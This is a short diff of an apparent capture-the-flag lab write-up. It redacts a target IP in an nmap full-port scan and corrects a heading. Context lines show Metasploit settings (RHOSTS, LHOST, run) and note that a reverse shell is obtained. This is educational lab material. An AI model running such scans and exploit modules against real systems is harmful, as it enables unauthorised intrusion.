@@ -19,7 +19,7 @@ This write-up is for educational purposes only.
 5. Retrieve user and root flags
 ## Reconnaissance
 ### Nmap Scan
-```nmap -Pn -sS -sV -p- -T4 10.129.4.215 -oA tcpAll```
+```nmap -Pn -sS -sV -p- -T4 10.129.x.x -oA tcpAll```
 ### Result
 ```
 PORT      STATE SERVICE      VERSION                                                                                                                         
@@ -58,7 +58,7 @@ set RHOSTS 10.129.x.x
 set LHOST <your ip>
 run
 ```
-## Foothole
+## Foothold
 After running the exploit, a reverse shell is obtained verify access:
 ```
 getuid
